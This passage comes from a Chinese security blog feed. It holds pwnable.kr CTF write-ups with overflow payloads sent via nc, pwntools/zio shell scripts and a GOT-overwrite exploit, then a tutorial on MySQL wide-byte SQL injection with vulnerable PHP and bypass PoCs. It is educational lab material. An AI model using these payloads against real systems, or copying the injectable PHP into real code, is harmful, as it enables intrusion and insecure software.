class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-深入分析"><a href="#0x02-深入分析" class="headerlink" title="0x02 深入分析"></a>0x02 深入分析</h4><blockquote><ul><li>可以看到这段程序有两个函数，一个主函数、一个func()</li><li>主函数调用func(),并传入了一个参数<code>0xdeadbeef</code></li><li>func()可以看到关键的两个地方，一个是<code>gets(overflowme);</code>、一个是<code>system(&quot;/bin/sh&quot;);</code></li><li>可以看到当<code>key==0xcafebabe</code>时，可以获得一个shell,key是调用时传进来的参数，但是传的是0xdeadbeef，相等?不存在的</li><li>但是可以用<code>栈溢出</code>将函数调用时入栈的参数覆盖掉，让key==0xcafebabe</li></ul></blockquote><p>先用IDA打开看看吧</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-01.png" alt="IDA"><br></div><blockquote><ul><li><code>cmp [ebp+arg_0],0CAFEBABEh</code>这句对应<code>if(key == 0xcafebabe)</code>,可以知道key存到了ebp+arg_0</li><li>arg_0 = dword ptr 8;故key的地址为<code>ebp+8</code></li><li><code>call gets</code>上面两句lea eax,[ebp+s]和mov [esp],eax是为了提高栈顶，为了接收gets()传进来的数据</li><li>输入的数据从ebp+s,也就是<code>ebp-0x2c</code>开始存储。</li></ul></blockquote><p>现在用GDB调试下，停在<code>cmp [ebp+arg_0],0CAFEBABEh</code>处，下图是寄存器和汇编截图</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-02.png" alt="GDB"><br></div><p>下图是栈内数据的布局：</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-03.png" alt="GDB"><br></div><p>EAX中存储的为输入数据的首地址<code>0xffffce9c</code>,栈地址<code>0xffffced0</code>处存储的是func()调用的时候传入的key<code>0xdeadbeef</code>,现在算算0xffffced0-0xffffce9c=0x34,也就是52个字节，在后面加上<code>0xcafebabe</code>就覆盖了key，成功跳转</p><h4 id="0x03-构造并编写exp"><a href="#0x03-构造并编写exp" class="headerlink" title="0x03 构造并编写exp"></a>0x03 构造并编写exp</h4><p>系统只是调用了system函数，没有发现输入的话就会<code>终止</code>掉，所以我们可以向它传递一个标准输入：(cat -)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ⚙/pwn/pwnable.kr/bof (python -c &quot;print &apos;x&apos;*52 +&apos;\xbe\xba\xfe\xca&apos;&quot;)|nc pwnable.kr 9000 </span><br><span class="line">*** stack smashing detected ***: /home/bof/bof terminated</span><br><span class="line">overflow me :</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;x&apos;*52 +&apos;\xbe\xba\xfe\xca&apos;&quot;;cat -)|nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>这里若没有cat，因为nc的单向连接时<code>非持续性</code>的，那么传完payload后一个tcp会话就结束了，也就是没机会传cmd命令了，而加入cat，则让nc的这个tcp会话永不结束，直到用户输入Ctri+C。而cat又比较特殊，可以将用户输入原封不动返回并重定向给了nc…</p><p>下面是用<code>pwntools</code>写的自动化攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">52</span>+<span class="string">'\xbe\xba\xfe\xca'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>下面是用<code>zio</code>写的自动化攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">host = <span class="string">"pwnable.kr"</span></span><br><span class="line">port = <span class="number">9000</span></span><br><span class="line">io = zio((host,port),print_read=<span class="keyword">False</span>,print_write=<span class="keyword">False</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">52</span> + <span class="string">"\xbe\xba\xfe\xca"</span> + <span class="string">"\n"</span></span><br><span class="line">io.write(payload+<span class="string">"\n"</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><blockquote><p><strong>题目描述：</strong><br>Papa brought me a packed present! let’s open it.<br>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a><br>This is reversing task. all you need is binary</p></blockquote><h4 id="0x00-题目分析-3"><a href="#0x00-题目分析-3" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>题目说这是一个逆向的题目，将题目给的文件下载下来，先用IDA打开看一下</p><div align="left"><br>    <img src="/resources/2018/2018-04-26-00.png" alt="IDA"><br></div><p>可以看到这不是一个正常的情况，结合逆向的提示，估计是被加了壳，用strings查看flag文件，在最后发现了UPX，说明被加了<code>UPX壳</code>，用下面的命令进行脱壳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d flag -o deflag</span><br></pre></td></tr></table></figure><h4 id="0x01-获取flag"><a href="#0x01-获取flag" class="headerlink" title="0x01 获取flag"></a>0x01 获取flag</h4><p>然后将去壳的<code>deflag</code>再用IDA打开看一下，定位到main函数，可以看到<code>mov rdx, cs:flag</code></p><div align="left"><br>    <img src="/resources/2018/2018-04-26-01.png" alt="IDA"><br></div><p>双击flag，可以定位到这样一字符串（也可以用shift+F12,查看字符串）</p><div align="left"><br>    <img src="/resources/2018/2018-04-26-02.png" alt="IDA"><br></div><p>将这串字符串提交，通过了。可以看到这道题就是考了<code>脱壳</code>的知识点。</p><h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote><p><strong>题目描述：</strong><br>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?<br>ssh passcode@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析-4"><a href="#0x00-题目分析-4" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>依旧先登录一下</p><div align="left"><br>    <img src="/resources/2018/2018-04-26-03.png" alt="ssh"><br></div><p>可以看到当前目录下有三个文件，<code>flag</code>、<code>passcode</code>、<code>passcode.c</code>,当然了当前用户对flag肯定是没有读写权限的，所以查看一下passcode.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passcode1;</span><br><span class="line">    <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-深入分析"><a href="#0x01-深入分析" class="headerlink" title="0x01 深入分析"></a>0x01 深入分析</h4><blockquote><ul><li>可以看到main函数里调用了两个函数，<code>welcome()</code>和<code>login()</code></li><li>welcome和login拥有相同的<code>ebp</code>，栈帧有交叉</li><li>welcome()函数里接收了一个最大大小为100个字符的name字符串</li><li>login()函数里接收了两个变量<code>passcode1</code>和<code>passcode2</code>,并且分别与<code>338150</code>和<code>13371337</code>进行比较</li><li>如果都相等，则输出flag</li><li>但是scanf()用的有问题，没有用&amp;取地址符号，如果scanf没加&amp;的话，程序会默认从栈中读取4个字节的数据当做scanf取的地址</li><li>也就是说不能通过这两个scanf()突破限制，所以重任就落在了<code>name</code>的身上</li></ul></blockquote><p>先看一下name、passcode1、passcode2在栈中的位置</p><div align="left"><br>    <img src="/resources/2018/2018-04-27-00.png" alt="name"><br></div><div align="left"><br>    <img src="/resources/2018/2018-04-27-01.png" alt="passcode"><br></div><p>可以看到name在栈中的起始位置是<code>ebp-0x70</code>,passcode1和passcode2在栈中的位置分别为<code>ebp-0x10</code>、<code>ebp-0x0c</code>,(ebp-0x70)-(ebp-0x10)=96,由于程序给name分配了100个字节的空间，所以刚好可以覆盖到passcode1,但是由于开启了<code>canary</code>,所以不能再继续覆盖到passcode2，但是GOT表是可写的。因此，可以把passcode1的地址修改为fflush()或printf()或exit()的GOT表地址，然后通过scanf()传入system()的地址，将fflush()或printf()或exit()的真实地址覆盖，这样就拿到shell了。</p><div align="left"><br>    <img src="/resources/2018/2018-04-27-02.png" alt="checksec"><br></div><div align="left"><br>    <img src="/resources/2018/2018-04-27-03.png" alt="GOT表"><br></div><div align="left"><br>    <img src="/resources/2018/2018-04-27-04.png" alt="system地址"><br></div><h4 id="0x02-构造payload并编写exp"><a href="#0x02-构造payload并编写exp" class="headerlink" title="0x02 构造payload并编写exp"></a>0x02 构造payload并编写exp</h4><p>这里我用system的地址<code>覆盖fflush()</code>在GOT表中存的真实地址，因为scanf()以%d获取数据，所以system()的地址<code>0x80485e3</code>要转化成十进制数<code>134514147</code>,现在构造payload获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+&apos;134514147\n&apos;&quot; | ./passcode</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./passcode'</span>)</span><br><span class="line"></span><br><span class="line">fflush_got = <span class="number">0x0804a004</span></span><br><span class="line">system_addr = <span class="number">0x080485e3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">96</span></span><br><span class="line">payload += p32(fflush_got)</span><br><span class="line">payload += str(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>这道题涉及到的知识点是GOT表是可写的，scanf()如果没有加&amp;取地址符，就会在栈上取地址作为传入的数据的存放地址</p><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><blockquote><p><strong>题目描述：</strong><br>Daddy, teach me how to use random value in programming!<br>ssh random@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析-5"><a href="#0x00-题目分析-5" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>从题目名称和题目描述可以看出，这道题和<code>随机数</code>有关系，先来链接一下靶机看看</p><div align="left"><br>    <img src="/resources/2018/2018-04-28-00.png" alt="ssh"><br></div><p>可以看到当前目录下有三个文件，<code>flag</code>、<code>random</code>、<code>random.c</code>,现在查看一下random.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">    random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-深入分析-1"><a href="#0x01-深入分析-1" class="headerlink" title="0x01 深入分析"></a>0x01 深入分析</h4><p>可以看到<code>random.c</code>使用了stdlib.h中的rand()函数，讲到rand()函数，就要说一下srand()函数，下面先介绍一下<code>rand()</code>函数和<code>srand()</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*****************************rand()函数********************************</span><br><span class="line">函数原型：int rand(void)；</span><br><span class="line">返回值：返回一个[0，RAND_MAX]之间的随机整数</span><br><span class="line">说明：rand()函数产生的随机数并不是真正的随机数，是伪随机数，它会将srand()产生</span><br><span class="line">     的随机数种子作为随机数序列的初始值。如果每次的种子不同，就可以产生不同的随</span><br><span class="line">     机数序列。如果种子是相同的，产生的随机数序列也是相同的。若未设置随机数种子，</span><br><span class="line">     默认是随机数种子为1，这里就是这种情况</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">****************************srand()函数********************************</span><br><span class="line">函数原型：void srand(unsigned seed)；</span><br><span class="line">函数参数：参数seed就是设置的随机数种子</span><br><span class="line">说明：系统在调用rand()函数之前，会自动调用srand()，如果用户在rand()之前曾调用</span><br><span class="line">     过srand()给参数seed指定了一个值，那么 rand()就会将seed的值作为产生伪随机</span><br><span class="line">     数的初始值；而如果用户在rand()前没有调用过srand()，那么系统默认将1作为伪</span><br><span class="line">     随机数的初始 值。如果给了一个定值，那么每次rand()产生的随机数序列都是一样的~~</span><br></pre></td></tr></table></figure><p>我们可以看到，random.c里用了<code>rand()</code>函数，但是没有对随机数种子进行设置，所以，每次运行这个程序的时候，产生的第一个随机数都是确定的。可以有好几种方法获得这个序列的第一个随机值，可以写一段代码将第一个随机数打印出来，也可以用调试器调试，看执行完rand()函数后，<code>rax</code>或者<code>eax</code>内的值，就是rand()函数的返回值.我用gdb查看rax的值，先在rand()函数后下一个断点，运行到断点出，可以看到rax的值如下图所示：(0x6b8b4567==1804289383)</p><div align="left"><br>    <img src="/resources/2018/2018-04-28-01.png" alt="gdb"><br></div><h4 id="0x02-获取flag"><a href="#0x02-获取flag" class="headerlink" title="0x02 获取flag"></a>0x02 获取flag</h4><blockquote><ul><li>当<code>if((key ^ random) == 0xdeadbeef)</code>成立时，会将flag显示出来</li><li>random在上面已经得到了，<code>random=0x6b8b4567</code></li><li>key是我们需要输入的，我们知道^(异或)运算是<code>可逆</code>的</li><li>所以key=random^0xdeadbeef,<code>key=3039230856</code></li></ul></blockquote><div align="left"><br>    <img src="/resources/2018/2018-04-28-02.png" alt="flag"><br></div><h4 id="0x03-总结-1"><a href="#0x03-总结-1" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>这道题的知识点是<code>rand()</code>函数，如果未用<code>srand()</code>设置随机数种子，则默认随机数种子为1，产生的随机数序列是确定的</p><h2 id="Rookiss"><a href="#Rookiss" class="headerlink" title="[Rookiss]"></a>[Rookiss]</h2><h2 id="Grotesque"><a href="#Grotesque" class="headerlink" title="[Grotesque]"></a>[Grotesque]</h2><h2 id="Hacker’s-Secret"><a href="#Hacker’s-Secret" class="headerlink" title="[Hacker’s Secret]"></a>[Hacker’s Secret]</h2>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MySQL宽字节注入</title>
      <link href="/2018/01/27/MySQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/01/27/MySQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<blockquote><p>今天做了一道CTF题目，关于MySQL宽字节注入的问题。这是一个由字符编码引起的漏洞，话不多说，进入分析。<br><a id="more"></a></p></blockquote><h3 id="0x00-经典的SQL注入漏洞"><a href="#0x00-经典的SQL注入漏洞" class="headerlink" title="0x00 经典的SQL注入漏洞"></a>0x00 经典的SQL注入漏洞</h3><blockquote><p>这是没有任何SQL注入防护措施的PHP程序，它存在SQL注入漏洞。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  $name=$_GET[<span class="string">'name'</span>];  </span><br><span class="line">  $conn=mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);  </span><br><span class="line">  <span class="keyword">if</span>($conn==<span class="keyword">null</span>)&#123;<span class="keyword">exit</span>(<span class="string">"connect error !&lt;br&gt;"</span>);&#125;  </span><br><span class="line">  mysql_select_db(<span class="string">"aaa"</span>,$conn);  </span><br><span class="line">  $sql=<span class="string">"select * from a1 where name='"</span>.$name.<span class="string">"'"</span>;  </span><br><span class="line">  $result=mysql_query($sql,$conn);  </span><br><span class="line">  <span class="keyword">while</span>($val=mysql_fetch_row($result))&#123;  </span><br><span class="line">      print_r($val);  </span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>对该PHP程序的SQL注入POC包括：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?name=a&apos;or &apos;a&apos;=&apos;a</span><br><span class="line">http://127.0.0.1/test.php?name=a&apos;or 1=1 -- %20</span><br><span class="line">http://127.0.0.1/test.php?name=a&apos;or 1=1 -- %23</span><br></pre></td></tr></table></figure><p>其中，%20对应空格，%23对应#的URL编码，该POC在PHP5.4.45+Apache测试成功。</p><h3 id="0x01-安全过滤"><a href="#0x01-安全过滤" class="headerlink" title="0x01 安全过滤"></a>0x01 安全过滤</h3><p>如果对上面例子1中的PHP程序中的$name变量进行安全过滤，如使用下列转义函数，则对应的POC全部失效了。</p><blockquote><p>(1)addslashes<br>(2)mysql_real_escape_string<br>(3)mysql_escape_string</p></blockquote><p>转义函数影响的字符包括：</p><ul><li>(1) ASCII(NULL))字符\x00</li><li>(2) 换行字符\n，addslashes不转义</li><li>(3) 回车字符\r，addslashes不转义</li><li>(4) 反斜杠字符\</li><li>(5) 单引号字符‘</li><li>(6) 双引号字符“</li><li>(7) \x1a，addslashes不转义</li></ul><p>对于例子1进行安全增强后，得到例子2，如下所示。<br>注意：三个转义函数的功能稍有区别，同时，转义只对字符型SQL注入防范有效，对于数值型SQL注入无效。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];  </span><br><span class="line"><span class="comment">//$name=addslashes($name);  </span></span><br><span class="line"><span class="comment">//$name=mysql_escape_string($name);  </span></span><br><span class="line">$conn=mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);  </span><br><span class="line">$name=mysql_real_escape_string($name);  </span><br><span class="line"><span class="keyword">if</span>($conn==<span class="keyword">null</span>)&#123;<span class="keyword">exit</span>(<span class="string">"connect error !&lt;br&gt;"</span>);&#125;  </span><br><span class="line">mysql_select_db(<span class="string">"aaa"</span>,$conn);  </span><br><span class="line">$sql=<span class="string">"select * from a1 where name='"</span>.$name.<span class="string">"'"</span>;  </span><br><span class="line">$result=mysql_query($sql,$conn);  </span><br><span class="line"><span class="keyword">while</span>($val=mysql_fetch_row($result))&#123;  </span><br><span class="line">    print_r($val);  </span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x02-宽字节注入漏洞原理"><a href="#0x02-宽字节注入漏洞原理" class="headerlink" title="0x02 宽字节注入漏洞原理"></a>0x02 宽字节注入漏洞原理</h3><p>宽字符是指两个字节宽度的编码技术，如UNICODE、GBK、BIG5等。当MYSQL数据库数据在处理和存储过程中，涉及到的字符集相关信息包括：</p><blockquote><p>(1) character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。<br>(2) character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。<br>(3) character_set_database:数据库缺省编码字符集。<br>(4) character_set_filesystem:文件系统编码字符集。<br>(5) character_set_results:SQL语句执行结果编码字符集。<br>(6) character_set_server:服务器缺省编码字符集。<br>(7) character_set_system:系统缺省编码字符集。<br>(8) character_sets_dir:字符集存放目录，一般不要修改。</p></blockquote><p>宽字节对转义字符的影响发生在character_set_client=gbk的情况，也就是说，如果客户端发送的数据字符集是gbk，则可能会吃掉转义字符\，从而导致转义消毒失败。例子3就是一个存在宽字符注入漏洞的PHP程序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];  </span><br><span class="line">$name=addslashes($name);  </span><br><span class="line">$conn=mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);  </span><br><span class="line"><span class="keyword">if</span>($conn==<span class="keyword">null</span>)&#123;<span class="keyword">exit</span>(<span class="string">"connect error !&lt;br&gt;"</span>);&#125;  </span><br><span class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>,$conn);  </span><br><span class="line">mysql_select_db(<span class="string">"aaa"</span>,$conn);  </span><br><span class="line">$sql=<span class="string">"select * from a1 where name='"</span>.$name.<span class="string">"'"</span>;  </span><br><span class="line">$result=mysql_query($sql,$conn);  </span><br><span class="line"><span class="keyword">while</span>($val=mysql_fetch_row($result))&#123;  </span><br><span class="line">    print_r($val);  </span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个PHP程序的SQL注入POC为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/t3.php?name=a%df&apos; or 1=1; %20%23</span><br></pre></td></tr></table></figure></p><p>其原理是mysql_query(“SETNAMES ‘gbk’”,$conn)语句将编码字符集修改为gbk，此时，%df\’对应的编码就是%df%5c’，即汉字“運’”，这样单引号之前的转义符号“\”就被吃调了，从而转义消毒失败</p><h3 id="0x04-宽字节注入漏洞再深入"><a 